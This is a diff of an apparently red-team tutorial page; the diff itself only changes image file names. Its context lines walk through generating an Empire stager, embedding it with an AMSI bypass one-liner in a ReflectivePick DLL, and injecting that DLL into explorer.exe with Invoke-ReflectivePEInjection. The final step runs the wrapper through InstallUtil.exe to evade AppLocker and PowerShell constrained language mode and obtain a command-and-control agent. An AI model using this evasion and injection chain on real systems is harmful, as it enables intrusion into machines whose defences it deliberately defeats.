@@ -23,9 +23,9 @@ set Listener http
 generate
 ```
 
-![](../.gitbook/assets/image%20%2815%29.png)
+![](../.gitbook/assets/image%20%2821%29.png)
 
-![](../.gitbook/assets/image%20%2814%29.png)
+![](../.gitbook/assets/image%20%2820%29.png)
 
 ### ReflectivePick with Visual Studio
 
@@ -33,11 +33,11 @@ We are now going to write the stager we generated into the ReflectivePick projec
 
 Open the [PowerPick project ](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick/ReflectivePick)in VS. It may be necessary to set the target to x64. Project -&gt; ReflectivePick properties -&gt; Configuration Manager -&gt; Platform
 
-![](../.gitbook/assets/image%20%2817%29.png)
+![](../.gitbook/assets/image%20%2823%29.png)
 
 Add the base64 from the stager where appropriate.
 
-![](../.gitbook/assets/image%20%2819%29.png)
+![](../.gitbook/assets/image%20%2826%29.png)
 
 `wchar_t* argument = L"[Ref].Assembly.GetType('System.Management.Automation.sAmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);$encoded = \"BASE64STRING\";$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded));$decoded | Out-File -FilePath C:\Windows\Tasks\out.txt;IEX $decoded"; //Output debug`
 
@@ -45,21 +45,21 @@ This includes an output write for demonstration purposes. You can remove it if y
 
 Compile the dll to `ReflectivePick_x64.dll`
 
-![](../.gitbook/assets/image%20%2827%29.png)
+![](../.gitbook/assets/image%20%2839%29.png)
 
 ### Execution
 
 We can now try to run the dll with `rundll32.exe .\ReflectivePick_x64.dll,Void` but as you will soon discover, AMSI picks up the Empire stager during runtime.
 
-![](../.gitbook/assets/image%20%2810%29.png)
+![](../.gitbook/assets/image%20%2816%29.png)
 
 Disable AMSI however, and you get an agent back.
 
-![](../.gitbook/assets/image%20%2839%29.png)
+![](../.gitbook/assets/image%20%2857%29.png)
 
 You can also view the base64-decoded stager payload in `c:\windows\tasks\out.txt`
 
-![](../.gitbook/assets/image%20%285%29.png)
+![](../.gitbook/assets/image%20%289%29.png)
 
 We can't rely on manually disabling AMSI, so we are going to run it through a few more hoops.
 
@@ -75,7 +75,7 @@ $Encoded = [System.Convert]::ToBase64String($Content)
 $Encoded | Out-File "C:\users\chris\Desktop\PowerTools-master\PowerPick\bin\x64\Debug\dll.txt"
 ```
 
-![](../.gitbook/assets/image%20%288%29.png)
+![](../.gitbook/assets/image%20%2814%29.png)
 
 Now you want to download [Invoke-ReflectivePEInjection](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) to the working directory and open it in a text editor. At the bottom of the file, add the following lines, where we copypaste the contents of `dll.txt` to the `$dllData` object. This will ensure the dll is reflectively injected into the `explorer.exe` process during runtime.
 
@@ -86,7 +86,7 @@ $Bytes = [System.Convert]::FromBase64String($dllData)
 Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $ProcId
 ```
 
-![](../.gitbook/assets/image%20%2836%29.png)
+![](../.gitbook/assets/image%20%2851%29.png)
 
 ### Compile to an EXE using VS
 
@@ -98,11 +98,11 @@ $Encoded = [System.Convert]::ToBase64String($Content)
 $Encoded | Out-File "C:\users\chris\Desktop\PowerTools-master\PowerPick\bin\x64\Debug\pe.txt"
 ```
 
-![](../.gitbook/assets/image%20%2834%29.png)
+![](../.gitbook/assets/image%20%2849%29.png)
 
 Open the [Bypass project](https://github.com/MortenSchenk/Babuska-Dolls/tree/master/Bypass) in VS and copypaste the base64 into the encoded variable. Compile to `Bypass.exe` with VS.
 
-![](../.gitbook/assets/image%20%2823%29.png)
+![](../.gitbook/assets/image%20%2833%29.png)
 
 ### Final execution
 
@@ -112,9 +112,9 @@ Use `installutil.exe` or similar [LOLbBns ](https://github.com/LOLBAS-Project/LO
 C:\windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe 
 ```
 
-![](../.gitbook/assets/image%20%287%29.png)
-
 ![](../.gitbook/assets/image%20%2813%29.png)
+
+![](../.gitbook/assets/image%20%2819%29.png)
 
 Thrilling! We bypassed both Applocker and Powershell constrained language mode and got an Empire agent back.
 
